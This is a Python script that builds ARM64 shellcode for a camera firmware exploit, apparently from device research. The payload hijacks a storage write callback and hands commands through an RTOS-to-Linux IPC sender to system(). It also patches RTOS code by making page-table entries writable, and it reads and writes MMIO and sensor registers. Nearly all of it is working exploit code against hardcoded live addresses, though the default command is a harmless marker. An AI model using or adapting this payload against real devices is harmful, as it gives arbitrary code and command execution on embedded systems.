#!/usr/bin/env python3
"""Build the live BF RAM payload (same-mode storage-callback trigger).

Live facts this payload is written against (measured 2026-11-05):

  base global [0x4d7301a00]          = 0x400d10c00
  storage write callback slot        = 0x4d729bd00
  original value at that slot        = 0x4d31254f0
  RTOS->Linux IPC sender             = 0x4d31dd0f0
  IPC message layout                 : +0 u16 tid, +2 u16 selector,
                                       +4 u32 0, +8 NUL-terminated command
  selector 1 on the Linux side       : aligned copy <=256 bytes -> system()

The payload is called through
  sub_4D3135960 -> [ [0x4d3135d48] + 0x18 ]   (the storage write callback)
with (w0 = block index, w1 = count, x2 = buffer) and must return w0 = 0.

Payload behaviour:
  1. save x29/x30
  2. restore the original callback at 0x4d729bd00
  3. call the IPC sender with the request (mode "ipc")
     or store a marker word (mode "marker", benign execution proof)
  4. return w0 = 0

The payload blob is code followed by the request data, written with one
0x900a write.  This module only builds bytes; it writes no files and does
not contact the camera.

Run:
  .venv-focus-lift/bin/python build_live_payload.py --mode marker --addr 0x447589000
"""

import argparse
import json
import struct


def movz_x(rd, imm16, shift=0):
    assert 0 <= imm16 <= 0xFFFF and shift in (0, 16, 32, 48)
    return 0xD2800000 | ((shift // 16) << 21) | (imm16 << 5) | rd


def movk_x(rd, imm16, shift=0):
    assert 0 <= imm16 <= 0xFFFF and shift in (0, 16, 32, 48)
    return 0xF2800000 | ((shift // 16) << 21) | (imm16 << 5) | rd


def movz_w(rd, imm16):
    assert 0 <= imm16 <= 0xFFFF
    return 0x52800000 | (imm16 << 5) | rd


def load_imm64(rd, value, out):
    out.append(movz_x(rd, value & 0xFFFF, 0))
    for shift in (16, 32, 48):
        part = (value >> shift) & 0xFFFF
        if part:
            out.append(movk_x(rd, part, shift))


STP_X29_X30_PRE16 = 0xA9BF7BFD
LDP_X29_X30_POST16 = 0xA8C17BFD
RET = 0xD65F03C0
MOV_W0_0 = movz_w(0, 0)


def str_x_rt_rn(rt, rn, offset=0):
    assert offset % 8 == 0 and 0 <= offset // 8 < 0x1000
    return 0xF9000000 | ((offset // 8) << 10) | (rn << 5) | rt


def blr_x(rn):
    return 0xD63F0000 | (rn << 5)


def build(mode, code_addr, restore_value=0x4D31254F0, slot=0x4D729BD00,
          sender=0x4D31DD0F0, command=None, timeout=0xBB8, tid=0x4246,
          marker_addr=0x4D729BD08, marker_value=0x42464D41524B0001,
          args_addr=0x0, value=0, dest_addr=None):
    if dest_addr is None:
        dest_addr = code_addr + 0x400
    insns = [STP_X29_X30_PRE16]

    # 1. restore the original storage callback
    load_imm64(0, restore_value, insns)
    load_imm64(1, slot, insns)
    insns.append(str_x_rt_rn(0, 1))          # str x0, [x1]

    request = b""
    if mode == "sensor_write":
        # call the RTOS imager SPI register write: sub_4D3223D90(u16 reg, u8 val)
        insns.append(movz_w(0, args_addr & 0xFFFF))     # reg
        insns.append(movz_w(1, value & 0xFF))           # value
        load_imm64(16, 0x4D3223D90, insns)
        insns.append(blr_x(16))
        load_imm64(9, dest_addr, insns)
        insns.append(0xB9000120)          # str w0, [x9]  (SPI result)
    elif mode in ("caller_nop", "caller_restore"):
        # 0x4d321dc54  bl 0x4d30854f0 (0x97f99e27)  ->  nop (0xd503201f)
        L2ENTRY = 0x4D71484C8
        RW_DESC = 0x4D3200701
        RO_DESC = 0x4D3200781
        WORD = 0xD503201F if mode == "caller_nop" else 0x97F99E27
        load_imm64(0, L2ENTRY, insns)
        load_imm64(1, RW_DESC, insns)
        insns.append(0xF9000001)
        insns += [0xD508871F, 0xD5033F9F, 0xD5033FDF]
        load_imm64(0, 0x4D321DC54, insns)
        load_imm64(1, WORD, insns)
        insns.append(0xB9000001)
        insns += [0xD508711F, 0xD5033F9F, 0xD5033FDF]
        load_imm64(0, L2ENTRY, insns)
        load_imm64(1, RO_DESC, insns)
        insns.append(0xF9000001)
        insns += [0xD508871F, 0xD5033F9F, 0xD5033FDF]
    elif mode == "setter_revert":
        L2ENTRY = 0x4D71484C0
        RW_DESC = 0x4D3000701
        RO_DESC = 0x4D3000781
        PATCH1 = (0x4D3085558, 0xB9400042)   # mov w2,#0x101 -> ldr w2,[x2]
        PATCH2 = (0x4D308557C, 0xB9400046)   # mov w6,#0x101 -> ldr w6,[x2]
        load_imm64(0, L2ENTRY, insns)
        load_imm64(1, RW_DESC, insns)
        insns.append(0xF9000001)
        insns += [0xD508871F, 0xD5033F9F, 0xD5033FDF]
        for addr, word in (PATCH1, PATCH2):
            load_imm64(0, addr, insns)
            load_imm64(1, word, insns)
            insns.append(0xB9000001)
        insns += [0xD508711F, 0xD5033F9F, 0xD5033FDF]
        load_imm64(0, L2ENTRY, insns)
        load_imm64(1, RO_DESC, insns)
        insns.append(0xF9000001)
        insns += [0xD508871F, 0xD5033F9F, 0xD5033FDF]
    elif mode == "setter_patch":
        # Make the RTOS code block writable, patch the two layer-word loads in
        # IM_DISP_Set_OSD_Reverse_Display to 0x101, flush I-cache, restore RO.
        L2ENTRY = 0x4D71484C0
        RW_DESC = 0x4D3000701
        RO_DESC = 0x4D3000781
        PATCH1 = (0x4D3085558, 0x52802022)   # ldr w2,[x2] -> mov w2,#0x101
        PATCH2 = (0x4D308557C, 0x52802026)   # ldr w6,[x2] -> mov w6,#0x101
        load_imm64(0, L2ENTRY, insns)
        load_imm64(1, RW_DESC, insns)
        insns.append(0xF9000001)             # str x1,[x0]
        insns += [0xD508871F, 0xD5033F9F, 0xD5033FDF]   # tlbi vmalle1; dsb; isb
        for addr, word in (PATCH1, PATCH2):
            load_imm64(0, addr, insns)
            load_imm64(1, word, insns)
            insns.append(0xB9000001)         # str w1,[x0]
        insns += [0xD508711F, 0xD5033F9F, 0xD5033FDF]   # ic ialluis; dsb; isb
        load_imm64(0, L2ENTRY, insns)
        load_imm64(1, RO_DESC, insns)
        insns.append(0xF9000001)
        insns += [0xD508871F, 0xD5033F9F, 0xD5033FDF]
    elif mode in ("mmio_write", "mmio_read", "mmio_wr"):
        addr = args_addr
        if mode == "mmio_wr":
            load_imm64(0, addr, insns)
            insns.append(movz_w(1, value & 0xFFFF))
            if value >> 16:
                insns.append(movk_x(1, (value >> 16) & 0xFFFF, 16))
            insns.append(0xB9000001)          # str w1, [x0]
            insns.append(0xB9400002)          # ldr w2, [x0]   (read back)
            load_imm64(3, dest_addr, insns)
            insns.append(0xB9000062)          # str w2, [x3]
        elif mode == "mmio_write":
            load_imm64(0, addr, insns)
            insns.append(movz_w(1, value & 0xFFFF))
            if value >> 16:
                insns.append(movk_x(1, (value >> 16) & 0xFFFF, 16))
            insns.append(0xB9000001)          # str w1, [x0]
        else:
            load_imm64(0, addr, insns)
            insns.append(0xB9400001)          # ldr w1, [x0]
            load_imm64(2, dest_addr, insns)
            insns.append(0xB9000041)          # str w1, [x2]
    elif mode == "marker":
        load_imm64(0, marker_value, insns)
        load_imm64(1, marker_addr, insns)
        insns.append(str_x_rt_rn(0, 1))
    elif mode == "ipc":
        assert command is not None
        request = struct.pack("<HHI", tid, 1, 0) + command.encode("utf-8") + b"\x00"

        def emit_ipc(req_addr):
            seq = list(insns)
            load_imm64(0, req_addr, seq)         # x0 = request
            seq.append(movz_w(1, len(request)))  # w1 = length
            seq.append(movz_w(2, timeout))       # w2 = timeout
            seq.append(movz_x(3, 0))             # x3 = 0
            load_imm64(16, sender, seq)
            seq.append(blr_x(16))
            return seq

        req_addr = code_addr
        for _ in range(4):
            seq = emit_ipc(req_addr)
            code_len = 4 * (len(seq) + 3)  # + mov w0,#0, ldp, ret
            nxt = (code_addr + code_len + 7) & ~7
            if nxt == req_addr:
                break
            req_addr = nxt
        insns = seq
    else:
        raise SystemExit("unknown mode")

    insns.append(MOV_W0_0)
    insns.append(LDP_X29_X30_POST16)
    insns.append(RET)

    code = b"".join(struct.pack("<I", i) for i in insns)
    if mode == "ipc":
        pad = (-len(code)) % 8
        blob = code + b"\x00" * pad + request
    else:
        blob = code
    return {
        "mode": mode,
        "code_addr": hex(code_addr),
        "code_len": len(code),
        "blob_len": len(blob),
        "blob_hex": blob.hex(),
        "dest_addr": hex(dest_addr),
        "request_hex": request.hex() if request else None,
        "insn_count": len(insns),
        "restore_value": hex(restore_value),
        "slot": hex(slot),
        "sender": hex(sender),
        "command": command,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=("marker", "ipc"), default="marker")
    ap.add_argument("--addr", default="0x447589000")
    ap.add_argument("--command", default="echo bf-ram-ok > /media/root/SIGMA/bf-ram-ok")
    args = ap.parse_args()
    addr = int(args.addr, 16)
    result = build(args.mode, addr, command=args.command)
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
